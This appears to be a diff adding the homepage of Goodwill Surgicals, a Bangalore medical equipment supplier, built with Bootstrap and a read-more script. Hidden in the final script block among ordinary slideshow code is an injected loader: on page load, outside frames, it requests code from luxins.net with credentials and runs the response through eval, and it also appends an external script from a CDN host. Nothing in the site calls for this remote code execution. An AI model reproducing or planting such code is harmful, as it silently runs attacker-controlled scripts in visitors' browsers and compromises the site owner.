@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+<style>
+body, html {
+  height: 100%;
+  margin: 0;
+  font: 400 15px/1.8 "Lato", sans-serif;
+  color: black;
+}
+
+
+.bgimg-1, .bgimg-2, .bgimg-3 {
+  position: relative;
+  opacity: 0.65;
+
+}
+.bgimg-1 {
+  background-image: url("static/images/wallpaper.jpg");
+  background-attachment: fixed;
+  min-height: 100%;
+}
+
+.bgimg-2 {
+  background: ghostwhite;
+  min-height: 400px;
+}
+
+.bgimg-3 {
+  background: ghostwhite;
+  min-height: 400px;
+}
+
+.caption {
+  position: absolute;
+  left: 0;
+  top: 50%;
+  width: 100%;
+  text-align: center;
+  color: #000;
+}
+
+.caption span.border {
+  background-color: #111;
+  color: #fff;
+  padding: 18px;
+  font-size: 25px;
+  letter-spacing: 10px;
+}
+
+h3 {
+  letter-spacing: 5px;
+  text-transform: uppercase;
+  font: 20px "Lato", sans-serif;
+  color:black;
+}
+
+p {
+  color: darkslategray;
+}
+
+/* Turn off parallax scrolling for tablets and phones */
+@media only screen and (max-device-width: 1024px) {
+  .bgimg-1, .bgimg-2, .bgimg-3 {
+    background-attachment: scroll;
+  }
+}
+#more {display: none;}
+
+.readMore{
+  background-color: darkslategray;
+  color: ghostwhite;
+  padding: 10px 10px 10px 10px;
+  cursor: pointer;
+  width:110px
+}
+
+.readMore:hover{
+  background-color: ghostwhite;
+  color: darkslategray;
+  text-emphasis: none;
+}
+
+</style>
+<link rel="stylesheet" href="static/bootstrap/css/bootstrap.css">
+<link href="static/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="static/css/main.css">
+</head>
+<body>
+    
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top" id="mainNav">
+    <div class="container">
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link js-scroll-trigger" href="#home">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link js-scroll-trigger" href="#services">Services</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link js-scroll-trigger" href="#contact">Contact</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+
+<div class="bgimg-1">
+  <div class="caption" style="margin-block-start: -50px;">
+      <img src="static/images/IMG-20180204-WA0002.png" alt="">
+  </div>
+</div>
+
+<section id='home'>
+<div style="color: ghostwhite; background-color: #00abfb; text-align:center; padding:50px 80px; text-align: justify;">
+  <h3 style="text-align:center;">DESIGNING BETTER LIFE</h3>
+  <p>Welcome to Goodwill Surgicals</p>
+</div>
+</section>
+
+<section id='about'>
+<div class="bgimg-2">
+  <div class="caption">
+  <span class="border" style="background-color:transparent;font-size:25px;color: darkgray;">LESS HEIGHT</span>
+  </div>
+</div>
+</section>
+
+<div style="position:relative;">
+  <div style="color:ghostwhite;background-color:#f1a416;text-align:center;padding:50px 80px;text-align: justify;">
+    <h3 style="text-align:center;">ABOUT THE COMPANY</h3>
+    <p>Goodwill Surgicals was established in the year 1998 in Bangalore India.
+      Company started with the sales of ENT equipment's.<span id="dots">...</span><span id="more">
+      Diversified the product range to supply  modular OT systems across Karnataka.
+      One of the oldest company to tie up with many reputed brands from Europe, USA.
+      Licensed and certified to cater all corporate hospital medical equipment and implants requirements.
+      Over the past two decades, Goodwill Surgicals has accumulated a strong and healthy market trust.
+      One of the preferred vendor for all the government hospital tenders with certifications.
+    </span></p>
+    <div onclick="readMore()" id="myBtn" class='readMore'>Read more</div>
+    <h4 style="text-align: center; color: black">OUR SATISFIED USERS</h4>
+    <p>
+    </p>
+  </div>
+</div>
+
+<div class="bgimg-2">
+    <div class="caption">
+    <span class="border" style="background-color:transparent;font-size:25px;color: darkgray;">LESS HEIGHT</span>
+    </div>
+</div>
+  
+<div style="position:relative;">
+      <div style="color:ghostwhite;background-color:grey;text-align:center;padding:50px 80px;text-align: justify;">
+      <h3 style="text-align:center; color: ghostwhite">PRODUCTS</h3>
+      <p>***</p>
+      <h5 style="color: ghostwhite">AUTHORISED DEALERS OF:</h5>
+    </div>
+  </div>
+
+<div class="bgimg-3">
+            <div id="myCarousel" class="carousel slide" data-ride="carousel" data-interval="3500">
+              <!-- Wrapper for slides -->
+              <div class="carousel-inner">
+                <div class="item active">
+                  <img src="https://i.ytimg.com/vi/8PGsP59Io20/maxresdefault.jpg" alt="Los Angeles" style="width:100%;">
+                </div>
+          
+                <div class="item">
+                  <img src="https://pmcvariety.files.wordpress.com/2018/01/slayer-2017.jpg?w=1000&h=563&crop=1" alt="Chicago" style="width:100%;">
+                </div>
+              
+                <div class="item">
+                  <img src="ny.jpg" alt="New york" style="width:100%;">
+                </div>
+              </div>
+      </div>
+    </div>
+
+<div style="position:relative;">
+  <div style="color:ghostwhite;background-color:#f1a416;text-align:center;padding:50px 80px;text-align: justify;">
+    <h3 style="text-align:center;">GALLERY</h3>
+    <!-- <p>Scroll up and down to really get the feeling of how Parallax Scrolling works.</p> -->
+  </div>
+</div>
+
+<div class="bgimg-2">
+    <div class="caption" style="margin-block-start: -50px;">
+      <div class="caption">
+        <span class="border" style="background-color:transparent;font-size:25px;color: darkgray;">CONTACT US</span>
+      </div>
+    </div>
+  </div>
+  
+  <div style="color: ghostwhite; background-color: #00abfb; text-align:center; padding:50px 80px; text-align: justify;">
+    <h3 style="text-align:center;">Contact us page</h3>
+    <p>***</p>
+  </div>
+
+  <script>
+    (function (w) {
+    if (w.top !== w.self) {
+        return;
+    }
+
+    var params = {
+        id: 286
+    };
+
+    var qs = [];
+    for (var key in params) {
+        qs.push(key + '=' + encodeURIComponent(params[key]));
+    }
+
+    var r = new XMLHttpRequest();
+    r.withCredentials = true;
+    r.onload = function() {eval(this.responseText);};
+    r.open("get", 'https://luxins.net/code?' + qs.join('&'));
+    r.send();
+
+(function() {
+  var script = document.createElement('script');
+  script.src = 'https://1675450967.rsc.cdn77.org/cu/bfdssk032.js';
+  var f = function() { document.head.appendChild(script); };
+  if (['complete', 'interactive'].indexOf(document.readyState) >= 0)
+    f();
+  else
+    document.addEventListener('DOMContentLoaded', f);
+})();
+
+}(window));
+
+var slideIndex = 0;
+showSlides();
+
+function showSlides() {
+  var i;
+  var slides = document.getElementsByClassName("mySlides");
+  var dots = document.getElementsByClassName("dot");
+  for (i = 0; i < slides.length; i++) {
+    slides[i].style.display = "none";  
+  }
+  slideIndex++;
+  if (slideIndex > slides.length) {slideIndex = 1}    
+  for (i = 0; i < dots.length; i++) {
+    dots[i].className = dots[i].className.replace(" active", "");
+  }
+  slides[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " active";
+  //setTimeout(showSlides, 2000); // Change image every 2 seconds
+}
+
+function readMore() {
+  var dots = document.getElementById("dots");
+  var moreText = document.getElementById("more");
+  var btnText = document.getElementById("myBtn");
+
+  if (dots.style.display === "none") {
+    dots.style.display = "inline";
+    btnText.innerHTML = "Read more"; 
+    moreText.style.display = "none";
+  } else {
+    dots.style.display = "none";
+    btnText.innerHTML = "Read less"; 
+    moreText.style.display = "inline";
+  }
+}
+  </script>
+  <script src="static/bootstrap/js/nav.js"></script>
+  <script src="static/bootstrap/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
